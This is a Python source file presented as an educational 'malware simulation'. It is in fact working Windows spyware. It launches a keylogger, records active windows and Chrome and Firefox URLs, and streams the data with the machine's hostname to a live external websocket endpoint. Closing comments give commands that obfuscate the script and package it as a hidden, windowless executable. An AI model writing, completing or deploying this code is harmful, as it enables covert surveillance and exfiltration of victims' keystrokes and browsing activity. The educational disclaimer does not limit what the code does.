"""
Malware Simulation Framework - FOR EDUCATIONAL PURPOSES ONLY

This software is designed to simulate malware behavior in a controlled environment
for educational and research purposes. DO NOT use this in a production environment
or against systems without explicit permission.


Modes:
-Data Stealing Simulation
"""


import asyncio
import logging
import datetime
import time
import signal
import os
import socket
import psutil
import win32gui
import win32process
import win32api
import pprint
import socketio
from collections import deque
from pywinauto import Application
from pywinauto.findwindows import find_windows
from keylogger import run_keylogger



# Logging config
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

WEBSOCKET_URL = "https://gp49h60c-8000.inc1.devtunnels.ms/"
sio = socketio.AsyncClient()
data_queue = deque()

# Connect websocket
async def connect_websocket():
    while True:
        try:
            await sio.connect(WEBSOCKET_URL)
            logging.debug("WebSocket connected successfully.")
            return True
        except Exception as e:
            logging.error(f"WebSocket connection failed: {e}")
            await asyncio.sleep(5)

# Chrome URL extractor
def get_chrome_url_by_title(current_window_title):
    urls = []
    
    try:
        # Get a list of all Chrome windows using the find_windows function
        chrome_windows = find_windows(title_re=".*Chrome.*")
        
        if not chrome_windows:
            print("No Chrome windows found.")
            return []

        for hwnd in chrome_windows:
            try:
                # Connect to the Chrome window using its handle
                app = Application(backend="uia").connect(handle=hwnd)

                # Attempt to find the URL bar in each window
                win = app.window(handle=hwnd)
                url_bar = win.child_window(title="Address and search bar", control_type="Edit")
                url = url_bar.get_value()

                if url:
                    urls.append(url)
            except Exception as e:
                print(f"Error retrieving URL from window (handle {hwnd}): {e}")

    except Exception as e:
        print(f"Error connecting to Chrome: {e}")

    return urls



# Firefox URL extractor
def get_firefox_urls():
    urls = []
    try:
        firefox_windows = find_windows(title_re=".*Mozilla Firefox.*")
        if not firefox_windows:
            logging.debug("No Firefox windows found.")
            return []

        for hwnd in firefox_windows:
            try:
                app = Application(backend="uia").connect(handle=hwnd)
                firefox_window = app.window(handle=hwnd)
                omnibox = firefox_window.child_window(title="Search with Google or enter address", control_type="Edit")
                url = omnibox.get_value()
                if url:
                    urls.append(url)
            except Exception as e:
                logging.error(f"Error retrieving Firefox URL from window (handle {hwnd}): {e}")
    except Exception as e:
        logging.error(f"Error connecting to Firefox: {e}")
    return urls

# Track window focus time
class WindowTracker:
    def __init__(self):
        self.current_window = None
        self.current_executable = None
        self.start_time = None
        self.url_cache = {}
        self.url_update_interval = 1
        self.min_tracking_duration = 1

    def update_window(self, window_info):
        window_title, executable = window_info
        current_time = datetime.datetime.now()

        if self.current_window is None:
            self.current_window = window_title
            self.current_executable = executable
            self.start_time = current_time
            return None, None, None, None

        if self.current_window != window_title:
            old_window = self.current_window
            old_executable = self.current_executable
            old_start = self.start_time

            self.current_window = window_title
            self.current_executable = executable
            self.start_time = current_time

            time_spent = (current_time - old_start).total_seconds()
            if time_spent >= self.min_tracking_duration:
                return old_window, old_executable, old_start, current_time

        return None, None, None, None

    async def get_browser_url(self, executable, current_window_title):
        current_time = time.time()
        if executable in self.url_cache:
            cache_time, url = self.url_cache[executable]
            if current_time - cache_time < self.url_update_interval:
                return url

        url = None
        if executable.lower() == "chrome.exe":
            urls = get_chrome_url_by_title(current_window_title)
            url = urls[0] if urls else None
        elif executable.lower() == "firefox.exe":
            urls = get_firefox_urls()
            url = urls[0] if urls else None

        self.url_cache[executable] = (current_time, url)
        return url

async def send_data_to_websocket(event_name, data):
    try:
        await sio.emit(event_name, data)
        logging.debug("Data sent successfully.")

        while data_queue and sio.connected:
            queued_data = data_queue.popleft()
            await sio.emit(event_name, queued_data)
    except Exception as e:
        logging.error(f"Error sending data: {str(e)}")
        data_queue.append(data)

def get_active_window_info() -> tuple[str, str]:
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)

        if psutil.pid_exists(pid):
            process = psutil.Process(pid)
            executable = process.name()
            window_title = win32gui.GetWindowText(hwnd)
            return window_title, executable
    except Exception as e:
        logging.error(f"Error getting active window info: {str(e)}")
    return None, None

def extract_application_name(window_title, executable):
    if executable and executable.lower() in ['chrome.exe', 'firefox.exe', 'msedge.exe', 'safari.exe', 'opera.exe', 'brave.exe']:
        if ' - ' in window_title:
            parts = window_title.split(' - ')
            application_name = parts[0]
            browser_name = parts[-1]
            return application_name, browser_name
        else:
            return window_title, executable
    else:
        if ' - ' in window_title:
            application_name = window_title.split(' - ')[-1]
            return application_name, ""
        else:
            return window_title, ""

def is_browser(executable_name):
    if executable_name is None:
        return False

    return executable_name.lower() in [
        "chrome.exe", "firefox.exe", "msedge.exe",
        "safari.exe", "opera.exe", "brave.exe"
    ]

def validate_window_info(window_title, executable):
    return window_title and executable

async def shutdown():
    await sio.disconnect()
    logging.info("Disconnected and shutting down...")

async def main():
    keylogger_thread = run_keylogger()
    if not await connect_websocket():
        logging.error("Failed to establish initial connection")
        return

    hostname = socket.gethostname()
    window_tracker = WindowTracker()

    try:
        while True:
            try:
                window_info = get_active_window_info()
                if not window_info or not validate_window_info(*window_info):
                    await asyncio.sleep(0.1)
                    continue

                old_window, old_executable, old_start, end_time = window_tracker.update_window(window_info)

                if old_window and old_start and end_time:
                    application_name, browser_name = extract_application_name(old_window, old_executable)
                    current_url = None
                    if is_browser(old_executable):
                        current_url = await window_tracker.get_browser_url(old_executable, old_window)


                    time_spent = (end_time - old_start).total_seconds()

                    data = {
                        'pc_name': hostname,
                        'active_window': old_window,
                        'executable': old_executable,
                        'website': application_name,
                        'browser': browser_name,
                        'url': current_url,
                        'start_time': old_start.strftime('%Y-%m-%d %H:%M:%S'),
                        'end_time': end_time.strftime('%Y-%m-%d %H:%M:%S'),
                        'time_spent': time_spent,
                    }
                    await send_data_to_websocket('log_data', data)
                    pprint.pprint(data)

                await asyncio.sleep(0.1)

            except Exception as e:
                logging.error(f"Error in main loop: {e}")
                await asyncio.sleep(1)
    except asyncio.CancelledError:
        logging.info("Main loop cancelled")
    finally:
        await shutdown()

if __name__ == "__main__":
    import sys
    if os.name == 'nt':
        def handle_windows_signal(sig):
            if sig in (signal.SIGINT, signal.SIGTERM):
                asyncio.run(shutdown())
            return True
        win32api.SetConsoleCtrlHandler(handle_windows_signal, True)

    asyncio.run(main())




#pyarmor obfuscate --recursive --output dist/obf your_script.py

#pyinstaller --onefile --windowed --add-data "keylogger.py;." your_script.py
